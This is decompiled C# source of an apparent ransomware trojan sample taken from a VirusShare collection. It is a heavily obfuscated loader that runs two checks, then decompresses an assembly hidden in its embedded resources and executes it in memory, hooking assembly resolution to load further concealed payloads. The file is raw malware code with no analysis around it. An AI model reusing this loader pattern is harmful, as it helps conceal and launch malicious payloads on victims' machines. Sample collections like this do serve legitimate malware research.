// Decompiled with JetBrains decompiler
// Type: .
// Assembly: serLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EB10F7D0-661D-4A45-B90F-D464336E900E
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-2bf56eec4fab77d339385ad7d85e751f1d68713a932b01be3c5a86a9288e729f.exe

using \u0001;
using \u000E;
using \u000F;
using \u0010;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;

namespace \u0010
{
  internal static class \u0002
  {
    [STAThread]
    public static int \u0002([In] string[] obj0)
    {
      int num;
      try
      {
        if (!\u0010.\u0001.\u0002())
          num = -1;
        else if (!\u0004.\u0002())
        {
          num = -1;
        }
        else
        {
          AppDomain appDomain = \u0004\u0004.\u0095\u0002();
          appDomain.AssemblyResolve += new ResolveEventHandler(\u0002.\u0002);
          num = appDomain.ExecuteAssemblyByName(new AssemblyName(\u0008.\u0002(7778)), (Evidence) null, obj0);
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[1]{ (object) obj0 };
        \u0002.\u0002(ex, objArray);
      }
      return num;
    }

    public static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      try
      {
        return \u0002.\u0002(Convert.ToBase64String(\u0008\u0005.\u000E\u0006().GetBytes(obj1.Name.ToLowerInvariant())));
      }
      catch (Exception ex)
      {
        object obj = obj0;
        ResolveEventArgs resolveEventArgs = obj1;
        \u0002.\u0002(ex, obj, (object) resolveEventArgs);
        throw;
      }
    }

    public static Assembly \u0002([In] string obj0)
    {
      Stream manifestResourceStream;
      Assembly assembly1;
      int num;
      DeflateStream input1;
      try
      {
        manifestResourceStream = \u009C\u0004.\u0084\u0005().GetManifestResourceStream(obj0);
        try
        {
          Stream input2 = manifestResourceStream;
          if (input2 == null)
          {
            assembly1 = (Assembly) null;
          }
          else
          {
            num = new BinaryReader(input2).ReadInt32();
            input1 = new DeflateStream(manifestResourceStream, CompressionMode.Decompress);
            try
            {
              assembly1 = \u0099\u0004.\u0080\u0005(\u0080\u0005.\u007E\u008E\u0006((object) new BinaryReader((Stream) input1), num));
            }
            finally
            {
              if (input1 != null)
                \u0013\u0003.\u007E\u008D((object) input1);
            }
          }
        }
        finally
        {
          if (manifestResourceStream != null)
            \u0013\u0003.\u007E\u008D((object) manifestResourceStream);
        }
        return assembly1;
      }
      catch (Exception ex)
      {
        Stream stream = manifestResourceStream;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) num;
        DeflateStream deflateStream = input1;
        Assembly assembly2 = assembly1;
        string str = obj0;
        \u0002.\u0002(ex, (object) stream, (object) local, (object) deflateStream, (object) assembly2, (object) str);
        throw;
      }
    }
  }
}
